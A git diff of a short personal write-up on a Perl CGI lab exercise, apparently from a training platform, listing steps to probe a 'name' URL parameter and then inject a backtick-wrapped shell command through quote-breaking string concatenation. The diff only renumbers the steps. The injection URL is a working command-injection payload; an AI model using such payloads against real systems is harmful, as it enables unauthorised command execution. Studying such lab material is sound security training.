@@ -4,9 +4,9 @@ e-mail: pawel.k.werner@gmail.com
 linkedin: https://www.linkedin.com/in/pawe%C5%82-werner-31b40a53/
 
 *************** CGI SCRIPT ***************
-Using perl
-1. Go to http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker
-2. Change the url and inspect element http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker4
-3. Try to put '' and see what happens http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker
+1. Using perl
+a. Go to http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker
+b. Change the url and inspect element http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker4
+c. Try to put '' and see what happens http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker
 4%27.%27.%27.%27.%27.%27.
-4. Put the command using `: http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker4%27.%27.%27.%20`%20/usr/local/bin/score`%20.%27.
+d. Put the command using `: http://ptl-b7676811-3e034c96.libcurl.so/cgi-bin/hello?name=hacker4%27.%27.%27.%20`%20/usr/local/bin/score`%20.%27.
